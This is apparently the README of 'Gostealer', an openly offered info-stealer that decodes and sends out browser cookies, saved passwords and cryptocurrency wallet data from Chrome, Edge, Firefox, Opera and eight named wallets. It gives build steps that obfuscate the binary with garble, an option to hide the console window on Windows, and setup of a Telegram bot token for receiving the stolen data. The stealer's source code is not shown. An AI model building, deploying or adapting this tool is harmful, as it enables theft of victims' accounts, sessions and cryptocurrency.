# Gostealer
Gostealer decodes and sends all cookies, passwords and cryptocurrency wallets from chromium (and not only) browsers.

![Dependencies](https://img.shields.io/badge/dependencies-up%20to%20date-brightgreen.svg)
![Contributions welcome](https://img.shields.io/badge/contributions-welcome-orange.svg)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

<img src="https://github.com/4kord/gostealer/blob/main/telegram.png?raw=true" alt="Telegram" width="500">

#### Supported browsers

- Chrome
- Edge
- Firefox
- Opera
- OperaGX

#### Supported cryptocurrency wallets

- Atomic
- Binancechain
- Electrum
- Exodus
- Metamask
- Phantom
- Ronin
- Tronlink

## Installation
### From source
* Clone the repo
```sh
# You must have git preinstalled
git clone https://github.com/4kord/gostealer.git
```

* Install Go
```sh
# For Debian (Ubuntu, Xubuntu etc)
apt install golang

# For Arch (Endeavour, Manjaro etc)
pacman -S golang

# For macOS
brew install golang
```
* Build
```sh
# Change current directory to the cloned one and build
cd gostealer
garble -seed=random build

# If you don't want to show the terminal use -ldflags -H=windowsgui
garble -seed=random build -ldflags -H=windowsguid
```
And that's it!

Look at this [repository](https://github.com/burrowers/garble) to find out how to install garble 

## Configuration

You might want to change **bot token** and **archive password** before building.
Rename .env.example to .env and change values you need.
